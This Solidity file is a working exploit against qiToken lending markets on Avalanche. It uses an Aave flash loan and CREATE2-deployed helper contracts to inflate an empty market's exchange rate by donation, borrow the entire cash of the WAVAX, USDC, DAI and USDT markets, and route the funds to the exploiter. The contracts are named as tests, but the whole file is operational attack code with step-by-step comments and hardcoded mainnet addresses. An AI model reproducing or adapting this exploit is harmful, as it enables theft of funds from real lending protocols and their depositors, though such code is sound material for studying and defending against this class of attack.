// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IERC20 {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external view returns (string memory);

  function symbol() external view returns (string memory);

  function decimals() external view returns (uint8);

  function totalSupply() external view returns (uint256);

  function balanceOf(address owner) external view returns (uint256);

  function allowance(address owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 value) external returns (bool);

  function transfer(address to, uint256 value) external returns (bool);

  function transferFrom(address from, address to, uint256 value) external returns (bool);

  function withdraw(uint256 wad) external;

  function deposit(uint256 wad) external returns (bool);

  function owner() external view returns (address);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IQiToken {
    function borrow(uint borrowAmount) external returns (uint);

    function mint(uint mintAmount) external returns (uint);

    function redeem(uint redeemTokens) external returns (uint);

    function redeemUnderlying(uint redeemAmount) external returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint);

    function getCash() external view returns (uint);

    function totalSupply() external view returns (uint256);

    function underlying() external view returns (address);
}

interface IQiAvax is IQiToken {
    function liquidateBorrow(address borrower, IQiToken qiTokenCollateral) external payable;
}

interface IQiErc20 is IQiToken {
    function liquidateBorrow(address borrower, uint repayAmount, IQiToken qiTokenCollateral) external returns (uint);
}

interface IComptroller {
    function enterMarkets(address[] memory qiTokens) external returns (uint[] memory);
}

contract ETHTest {
    IERC20 WAVAX = IERC20(0x8d3d33232bfcb7B901846AE7B8E84aE282ee2882);
    IQiAvax qiWAVAX = IQiAvax(0x053ff10b742F664ad34c276FEf7b145dB14b54ef);
    IComptroller comptroller = IComptroller(0x26DB1b37a0C5076E0d2D6b10Dc0964c15521722f);
    IQiAvax qiAVAXDelegate;

    constructor(IQiAvax Delegate) payable {
        // First step, Deposit a small amount of WAVAX to the empty qiWAVAX pool to obtain shares
        qiAVAXDelegate = Delegate;
        WAVAX.approve(address(qiWAVAX), type(uint256).max);
        qiWAVAX.mint(4 * 1e8);
        qiWAVAX.redeem(qiWAVAX.totalSupply() - 2); // completing the initial deposit, the shares of qiWAVAX and the amount of WAVAX in qiWAVAX are at a minimum

        // Second step, Donate a large amount of WAVAX to the qiWAVAX pool to increase the exchangeRate(the number of WAVAX represented by each share
        (,,, uint256 exchangeRate_1) = qiWAVAX.getAccountSnapshot(address(this));
        uint256 donationAmount = WAVAX.balanceOf(address(this));
        WAVAX.transfer(address(qiWAVAX), donationAmount); // "donation" exchangeRate manipulation
        uint256 WAVAXAmountInqiWAVAX = WAVAX.balanceOf(address(qiWAVAX));
        (,,, uint256 exchangeRate_2) = qiWAVAX.getAccountSnapshot(address(this));

        // Third setp, Lend tokens from the qiWAVAX pool and send to exploiter
        address[] memory qiTokens = new address[](1);
        qiTokens[0] = address(qiWAVAX);
        comptroller.enterMarkets(qiTokens);
        uint256 borrowAmount = qiAVAXDelegate.getCash() - 1;
        qiAVAXDelegate.borrow(borrowAmount);
        payable(address(msg.sender)).transfer(address(this).balance);

        // Fouth step, redeem WAVAX from the qiWAVAX pool
        uint256 redeemAmount = donationAmount - 1;
        qiWAVAX.redeemUnderlying(redeemAmount);

        // Firth step, send WAVAX to exploiter
        WAVAX.transfer(msg.sender, WAVAX.balanceOf(address(this)));
    }
}

contract TokenTest {
    IERC20 WAVAX = IERC20(0x8d3d33232bfcb7B901846AE7B8E84aE282ee2882);
    IQiErc20 qiWAVAX = IQiErc20(0x053ff10b742F664ad34c276FEf7b145dB14b54ef);
    IComptroller comptroller = IComptroller(0x26DB1b37a0C5076E0d2D6b10Dc0964c15521722f);
    IQiErc20 qiErc20Delegate;

    constructor(IQiErc20 Delegate) payable {
        // First step, Deposit a small amount of WAVAX to the empty qiWAVAX pool to obtain shares
        qiErc20Delegate = Delegate;
        WAVAX.approve(address(qiWAVAX), type(uint256).max);
        qiWAVAX.mint(4 * 1e8);
        qiWAVAX.redeem(qiWAVAX.totalSupply() - 2); // completing the initial deposit, the shares of qiWAVAX and the amount of WAVAX in qiWAVAX are at a minimum

        // Second step, Donate a large amount of WAVAX to the qiWAVAX pool to increase the exchangeRate(the number of WAVAX represented by each share
        (,,, uint256 exchangeRate_1) = qiWAVAX.getAccountSnapshot(address(this));
        uint256 donationAmount = WAVAX.balanceOf(address(this));
        WAVAX.transfer(address(qiWAVAX), donationAmount); // "donation" exchangeRate manipulation
        uint256 WAVAXAmountInqiWAVAX = WAVAX.balanceOf(address(qiWAVAX));
        (,,, uint256 exchangeRate_2) = qiWAVAX.getAccountSnapshot(address(this));

        // Third setp, Lend tokens from the qiWAVAX pool and send to exploiter
        address[] memory qiTokens = new address[](1);
        qiTokens[0] = address(qiWAVAX);
        comptroller.enterMarkets(qiTokens);
        uint256 borrowAmount = qiErc20Delegate.getCash() - 1;
        qiErc20Delegate.borrow(borrowAmount);
        IERC20 underlyingToken = IERC20(qiErc20Delegate.underlying());
        underlyingToken.transfer(msg.sender, borrowAmount); // borrow token and send to exploiter

        // Fouth step, redeem WAVAX from the qiWAVAX pool
        uint256 redeemAmount = donationAmount;
        qiWAVAX.redeemUnderlying(redeemAmount);

        // Firth step, send WAVAX to exploiter
        WAVAX.transfer(msg.sender, WAVAX.balanceOf(address(this)));
    }
}

contract ContractTest {
    IERC20 USDC = IERC20(0xB82B1DB1d1B548DD07459A9Ba876A5e13c9d7544);
    IERC20 DAI = IERC20(0xff0e5a8CAF59ba4BFf8172CC3d61A8F608D3BC9a);
    IERC20 USDT = IERC20(0x31Ea255b4a214B18fC100C43b817D3a5866c75Ba);
    IERC20 WAVAX = IERC20(0x8d3d33232bfcb7B901846AE7B8E84aE282ee2882);
    IQiAvax qiAVAX = IQiAvax(0x4964741E6573Cda8CBB43c30F69828980077EB93);
    IQiErc20 qiUSDC = IQiErc20(0xcea4179099CdD951F538feEeDD5d59f73C0Fe9c7);
    IQiErc20 qiDAI = IQiErc20(0xe436cb93E11c1ad63c48F8Ff8BF36D7c13B6bBF9);
    IQiErc20 qiUSDT = IQiErc20(0xe0138a8BbB53339dE9800c89079CF14EDC3fE8E6);
    IQiErc20 qiWAVAX = IQiErc20(0x053ff10b742F664ad34c276FEf7b145dB14b54ef);
    IComptroller comptroller = IComptroller(0x26DB1b37a0C5076E0d2D6b10Dc0964c15521722f);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0xf319Bb55994dD1211bC34A7A26A336C6DD0B1b00);

    function start() external {
        aaveV3.flashLoanSimple(address(this), address(WAVAX), 5 * 1e18, new bytes(0), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        qiWAVAX.redeem(qiWAVAX.balanceOf(address(this)));

        avaxTests();
        tokenTests(qiUSDC, 282);
        tokenTests(qiDAI, 281_293_952_180_029);
        tokenTests(qiUSDT, 281);

        WAVAX.approve(address(aaveV3), type(uint256).max);
        return true;
    }

    function avaxTests() internal {
        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
        bytes memory creationBytecode = getETHTestCreationBytecode(address(qiAVAX));
        address testAddress = getAddress(creationBytecode, _salt);
        WAVAX.transfer(testAddress, WAVAX.balanceOf(address(this)));

        ETHTest ETHTester = new ETHTest{salt: bytes32(_salt)}(qiAVAX);
        qiAVAX.liquidateBorrow{value: 267_919_888_739}(address(ETHTester), qiWAVAX);
        qiWAVAX.redeem(1); // Withdraw remaining share from qiWAVAX
    }

    function tokenTests(IQiErc20 qiToken, uint256 repayAmount) internal {
        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
        bytes memory creationBytecode = getTokenTestCreationBytecode(address(qiToken));
        address testAddress = getAddress(creationBytecode, _salt);
        WAVAX.transfer(testAddress, WAVAX.balanceOf(address(this)));

        TokenTest tokenTester = new TokenTest{salt: bytes32(_salt)}(qiToken);
        IERC20 underlyingToken = IERC20(qiToken.underlying());
        underlyingToken.approve(address(qiToken), type(uint256).max);
        qiToken.liquidateBorrow(address(tokenTester), repayAmount, qiWAVAX);
        qiWAVAX.redeem(1); // Withdraw remaining share from qiWAVAX
    }

    function getETHTestCreationBytecode(address token) public pure returns (bytes memory) {
        bytes memory bytecode = type(ETHTest).creationCode;
        return abi.encodePacked(bytecode, abi.encode(token));
    }

    function getTokenTestCreationBytecode(address token) public pure returns (bytes memory) {
        bytes memory bytecode = type(TokenTest).creationCode;
        return abi.encodePacked(bytecode, abi.encode(token));
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }
}